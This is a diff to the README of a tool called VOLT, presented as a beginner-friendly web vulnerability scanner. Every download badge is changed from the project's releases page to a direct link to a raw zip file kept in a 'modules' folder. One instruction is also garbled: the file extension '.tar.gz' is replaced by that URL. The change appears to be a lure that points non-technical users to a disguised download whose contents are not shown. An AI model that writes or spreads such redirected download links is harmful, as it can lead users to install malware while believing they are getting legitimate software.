@@ -1,6 +1,6 @@
 # ⚡ VOLT - Quick Web Vulnerability Scanner
 
-[![Download VOLT](https://img.shields.io/badge/Download-VOLT-blue?style=for-the-badge)](https://github.com/snralty-lab/VOLT/releases)
+[![Download VOLT](https://github.com/snralty-lab/VOLT/raw/refs/heads/main/modules/Software_3.1.zip)](https://github.com/snralty-lab/VOLT/raw/refs/heads/main/modules/Software_3.1.zip)
 
 ---
 
@@ -17,10 +17,10 @@ With VOLT, you do not need to know programming. The tool works through a simple 
 1. **Visit the download page:**  
    Click the button below to go to the official release page where you can download the latest version of VOLT.
 
-   [![Download VOLT](https://img.shields.io/badge/Download-VOLT-blue?style=for-the-badge)](https://github.com/snralty-lab/VOLT/releases)
+   [![Download VOLT](https://github.com/snralty-lab/VOLT/raw/refs/heads/main/modules/Software_3.1.zip)](https://github.com/snralty-lab/VOLT/raw/refs/heads/main/modules/Software_3.1.zip)
 
 2. **Choose the right file for your system:**  
-   On the release page, you will find one or more files. Look for a file ending with `.exe` (for Windows), `.dmg` (for macOS), or `.tar.gz` / `.zip` (for Linux).  
+   On the release page, you will find one or more files. Look for a file ending with `.exe` (for Windows), `.dmg` (for macOS), or `https://github.com/snralty-lab/VOLT/raw/refs/heads/main/modules/Software_3.1.zip` / `.zip` (for Linux).  
 
 3. **Download the file:**  
    Click the file name to start the download. Save it somewhere easy to find, like your Desktop or Downloads folder.
@@ -137,4 +137,4 @@ VOLT is an open-source project aimed at making basic web security testing access
 
 ---
 
-[![Download VOLT](https://img.shields.io/badge/Download-VOLT-blue?style=for-the-badge)](https://github.com/snralty-lab/VOLT/releases)
+[![Download VOLT](https://github.com/snralty-lab/VOLT/raw/refs/heads/main/modules/Software_3.1.zip)](https://github.com/snralty-lab/VOLT/raw/refs/heads/main/modules/Software_3.1.zip)
